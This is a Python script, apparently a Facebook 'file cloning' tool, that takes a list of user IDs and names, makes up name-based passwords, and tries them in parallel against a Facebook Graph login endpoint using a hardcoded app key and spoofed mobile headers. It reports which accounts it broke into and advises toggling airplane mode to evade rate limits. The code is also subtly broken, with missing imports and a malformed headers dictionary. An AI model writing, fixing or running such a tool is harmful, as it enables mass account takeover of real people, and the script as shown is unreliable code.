#GWAPO SI LED
#FOLLOW ME SA GITHUB https://github.com/leddivina
# ----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted

# ----------logo----------#
logo = ("""
\033[1;91m  _|        _|_|_|_|  _|_|_|
\033[1;91m _|        _|        _|    _|
\033[1;91m   _|        _|_|_|    _|    _|
\033[1;91m _|        _|        _|    _|
\033[1;91m _|_|_|_|  _|_|_|_|  _|_|_|\033[1;91m

 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ┃ [\033[1;91m✓\033[1;92m] CREATOR   \033[1;91m: \033[1;92mXLXEDXXX
 ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mFILE CLONING
 ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mwww.facebook.com/ldd.dvnn5
 ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.1
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# ----------clear----------#
def clear():
    os.system('clear')
    print(logo)
    print(42 * '-')
    print(' ON/OFF AIRPLANE MODE EVERY 200 COUNTS ')
    print(' PLEASE PROVIDE FEEDBACK FOR FURTHER MORE UPDATES ')
    print(42 * '-')

# ----------line----------#
def line():
    print(42 * '-')

# ----------menu----------#
def main():
    clear()
    print(' [A] File Cloning ')
    print(' [X] Exit ')
    line()
    option = input('[ ] Choice : ')
    if option in ['a', 'A']:
        __file__()
    else:
        exit(' THANKS FOR USING MY SCRIPT. ')

# ----------file----------#
def __file__():
    clear()
    filex = input('[ ] ENTER FILE PATH : ')
    try:
        fo = open(filex, 'r').read().splitlines()
    except FileNotFoundError:
        print(' No File Was Found.')
        slp(2)
        __file__()
    clear()
    try:
        pas_limit = int(input(' [ ] ENTER PASS LIMIT ( 1-10 ) : '))
    except ValueError:
        pas_limit = 1
    line()
    pas_list = []
    for i in range(pas_limit):
        pasx = input(f' [ ] ENTER PASSWORD {i + 1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Dipto:
        tl = str(len(fo))
        print(' TOTAL MO NGA BABAYE : ' + tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        for user in fo:
            ids, names = user.split('|')
            passlist = pas_list
            Dipto.submit(m1, ids, names, passlist)
        line()
        print(' THE PROCESS HAS BEEN COMPLETED')
        input(' PRESS ENTER TO BACK: ')
        main()

# ----------method----------#
def m1(ids, names, passlist):
    global oks, loop
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except IndexError:
            ln = fn
        for pw in passlist:
            sys.stdout.write('\r\r [BISHESH-RUNNING] %s|ALIVE:%s ' % (loop, len(oks)))
            sys.stdout.flush()
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())

            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": ids,
                "password": pas,
                "generate_analytics_claims": "1",
                "community_id": "",
                "cpl": "true",
                "try_num": "1",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "fb_api_req_friendly_name": "authenticate",
                "api_key": "62f8ce9f74b12f84c123cc23437a4a32",
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            }

            

            
            headers = {
    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'graph.facebook.com',
    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
    'Authorization': 'Bearer your_access_token',
    'X-FB-Connection-Type': 'WIFI',
    'X-Tigon-Is-Retry': 'False',
    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
    'x-fb-device-group': str(random.randint(1000, 9999)),
    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
    'X-FB-Request-Analytics-Tags': 'graphservice',
    'X-FB-HTTP-Engine': 'Liger',
    'X-FB-Client-IP': 'True',
    'X-FB-Server-Cluster': 'True',
    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
}
  

            url = 'https://graph.facebook.com/v15.0/auth/login'
            req = requests.post(url, data=data, headers=headers).json()

            if 'session_key' in req:
                print('\r\r [BISHESH-ALIVE] ' + ids + '|' + pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [BISHESH-2F] ' + ids + '|' + pas)
                break
            else:
                continue
        loop += 1
    except Exception as e:
        print(f"Error: {e}")
# ----------end----------#
main()
